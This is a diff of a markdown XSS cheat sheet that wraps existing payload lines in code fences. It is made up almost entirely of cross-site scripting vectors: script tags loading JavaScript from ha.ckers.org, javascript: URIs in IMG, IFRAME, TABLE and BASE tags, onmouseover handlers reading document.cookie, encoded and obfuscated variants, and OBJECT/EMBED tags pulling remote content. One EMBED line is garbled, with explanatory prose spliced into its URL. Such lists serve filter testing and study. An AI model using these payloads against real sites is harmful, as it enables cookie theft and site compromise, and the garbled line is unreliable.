@@ -3,22 +3,22 @@
 # XSS Locator 2
 '';!--"<XSS>=&{()}
 
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+```<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
 
 <IMG SRC="javascript:alert('XSS');">
 
-<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>```
 
 # Grave Accent Obfuscation
-<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+```<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>```
 
 # Malformed A Tags
 # (not actually malformed)
-<a onmouseover="alert(document.cookie)">xxs link</a>
-<a onmouseover=alert(document.cookie)>xxs link</a>
+```<a onmouseover="alert(document.cookie)">xxs link</a>
+<a onmouseover=alert(document.cookie)>xxs link</a>```
 
 # Malformed IMG Tags
-<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+```<IMG """><SCRIPT>alert("XSS")</SCRIPT>">```
 
 # fromCharCode
 <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
@@ -194,41 +194,41 @@
 <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
 
 # IFRAME Event based
-<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+```<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>```
 
 # FRAME
-<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+```<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>```
 
 # TABLE
-<TABLE BACKGROUND="javascript:alert('XSS')">
+```<TABLE BACKGROUND="javascript:alert('XSS')">```
 
 # TD
-<TABLE BACKGROUND="javascript:alert('XSS')">
+```<TABLE BACKGROUND="javascript:alert('XSS')">```
 
 # DIV background-image
-<TABLE BACKGROUND="javascript:alert('XSS')">
+```<TABLE BACKGROUND="javascript:alert('XSS')">```
 
 # DIV background-image with unicoded XSS exploit
-<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.
+```<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.```
 
 # DIV background-image plus extra characters
-<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+```<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">```
 
 # DIV expression
-<DIV STYLE="width: expression(alert('XSS'));">
+```<DIV STYLE="width: expression(alert('XSS'));">```
 
 
 # "Downlevel-hidden block"
-<!--[if gte IE 4]> <SCRIPT>alert('XSS');</SCRIPT> <![endif]-->
+```<!--[if gte IE 4]> <SCRIPT>alert('XSS');</SCRIPT> <![endif]-->```
 
 # BASE tag
-<BASE HREF="javascript:alert('XSS');//">
+```<BASE HREF="javascript:alert('XSS');//">```
 
 # Object tag
-<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+```<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>```
 
 # Using an EMBED tag you can embed a Flash movie that contains XSS
-<EMBED SRC="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:org/xss.swf" AllowScriptAccess="always"></EMBED>
+```<EMBED SRC="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:org/xss.swf" AllowScriptAccess="always"></EMBED>```
 
 # You can EMBED SVG which can contain your XSS vector
 <EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
